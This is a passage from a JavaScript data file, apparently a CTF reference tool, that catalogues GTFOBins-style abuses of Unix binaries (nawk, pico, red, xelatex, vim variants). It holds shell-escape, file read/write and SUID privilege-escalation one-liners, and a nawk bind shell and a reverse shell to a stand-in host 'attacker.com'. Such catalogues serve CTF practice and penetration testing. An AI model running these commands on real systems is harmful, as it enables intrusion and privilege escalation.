    "shell": [{"code": "/path/to/ld.so /bin/sh", "comment": "The spawned process will be the loader, not the target executable, this might aid evasion.", "suid_code": "/path/to/ld.so /bin/sh -p"}]
  },
  "nawk": {
    name: "nawk",
    functions: ["bind-shell", "file-read", "file-write", "reverse-shell", "shell"],
    "bind-shell": [{"code": "nawk 'BEGIN {\n    s = \"/inet/tcp/12345/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'" }],
    "file-read": [{"code": "nawk '//' /path/to/input-file"}],
    "file-write": [{"code": "nawk 'BEGIN { print \"DATA\" > \"/path/to/output-file\" }'"}],
    "reverse-shell": [{"code": "nawk 'BEGIN {\n    s = \"/inet/tcp/0/attacker.com/12345\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'" }],
    "shell": [{"code": "nawk 'BEGIN {system(\"/bin/sh\")}'" }]
  },
  "nvim": {
    name: "nvim",
    functions: ["file-read", "inherit"],
    "file-read": [{"code": "nvim -c ':redir! >/path/to/output-file | echo \"DATA\" | redir END | q'"}],
    "inherit": [{"code": "nvim -c ':py ...'"}, {"code": "nvim -c ':lua ...'"}, {"code": "nvim"}]
  },
  "pico": {
    name: "pico",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "pico /path/to/input-file", "comment": "The file content is displayed in the terminal interface."}],
    "file-write": [{"code": "pico /path/to/output-file\nDATA\n^O"}],
    "shell": [{"code": "pico\n^R^X\nreset; sh 1>&0 2>&0"}, {"code": "pico -s /bin/sh\n/bin/sh\n^T^T", "comment": "The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.", "suid_code": "pico -s '/bin/sh -p'\n/bin/sh -p\n^T^T"}]
  },
  "red": {
    name: "red",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "red /path/to/input-file\n,p\nq"}],
    "file-write": [{"code": "red /path/to/output-file\na\nDATA\n.\nw\nq"}],
    "shell": [{"code": "red\n!/bin/sh\nq", "suid_code": "red\n!/bin/sh\nq"}]
  },
  "rview": {
    name: "rview",
    functions: ["file-read", "inherit"],
    "file-read": [{"code": "rview -c ':redir! >/path/to/output-file | echo \"DATA\" | redir END | q'"}],
    "inherit": [{"code": "rview -c ':py ...'"}, {"code": "rview -c ':lua ...'"}, {"code": "rview"}]
  },
  "rvim": {
    name: "rvim",
    functions: ["file-read", "inherit"],
    "file-read": [{"code": "rvim -c ':redir! >/path/to/output-file | echo \"DATA\" | redir END | q'"}],
    "inherit": [{"code": "rvim -c ':py ...'"}, {"code": "rvim -c ':lua ...'"}, {"code": "rvim"}]
  },
  "view": {
    name: "view",
    functions: ["file-read", "inherit"],
    "file-read": [{"code": "view -c ':redir! >/path/to/output-file | echo \"DATA\" | redir END | q'"}],
    "inherit": [{"code": "view -c ':py ...'"}, {"code": "view -c ':lua ...'"}, {"code": "view"}]
  },
  "vimdiff": {
    name: "vimdiff",
    functions: ["file-read", "inherit"],
    "file-read": [{"code": "vimdiff -c ':redir! >/path/to/output-file | echo \"DATA\" | redir END | q'"}],
    "inherit": [{"code": "vimdiff -c ':py ...'"}, {"code": "vimdiff -c ':lua ...'"}, {"code": "vimdiff"}]
  },
  "xelatex": {
    name: "xelatex",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{/path/to/input-file}\\end{document}'\nstrings texput.dvi", "comment": "The read file will be part of the PDF output."}],
    "file-write": [{"code": "xelatex '\\documentclass{article}\\newwrite\\tempfile\\begin{document}\\immediate\\openout\\tempfile=output-file.tex\\immediate\\write\\tempfile{DATA}\\immediate\\closeout\\tempfile\\end{document}'", "comment": "The file can only be written in the current directory, and the `.tex` extension is mandatory."}],
    "shell": [{"code": "xelatex --shell-escape '\\immediate\\write18{/bin/sh}'", "suid_code": "xelatex --shell-escape '\\immediate\\write18{/bin/sh}'"}]
  },
  "xetex": {
    name: "xetex",
    functions: ["shell"],
    "shell": [{"code": "xetex --shell-escape '\\immediate\\write18{/bin/sh}'", "suid_code": "xetex --shell-escape '\\immediate\\write18{/bin/sh}'"}]
  }
};
console.log("[CTF Bible] GTFOBins chargé :", Object.keys(GTFOBINS).length, "binaires");
